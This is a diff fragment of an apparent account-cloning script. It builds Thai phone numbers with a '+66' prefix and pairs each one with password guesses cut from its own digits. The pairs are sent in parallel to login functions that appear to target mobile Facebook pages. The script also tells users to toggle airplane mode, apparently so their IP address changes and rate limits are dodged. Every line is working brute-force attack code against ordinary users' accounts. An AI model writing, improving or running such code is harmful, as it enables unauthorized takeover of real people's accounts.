@@ -1201,8 +1201,8 @@ def SUMON3():
         print(f'[+] YOUR METHOD CHOOSED : M{SUMONfire}')
         linex();print('    USE FLIGHT (\033[1;32mAIRPLANE\033[1;32m) MODE BEFORE USE');linex()
         for love in user:
-            uidd = kode+love
-            uid ='66'+uidd
+            uidd=kode+love
+            uid ='+66' +uidd
             pwx = [uidd[:6],uidd,uidd[:8],uidd[2:],uidd[4:]]
             if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
             elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
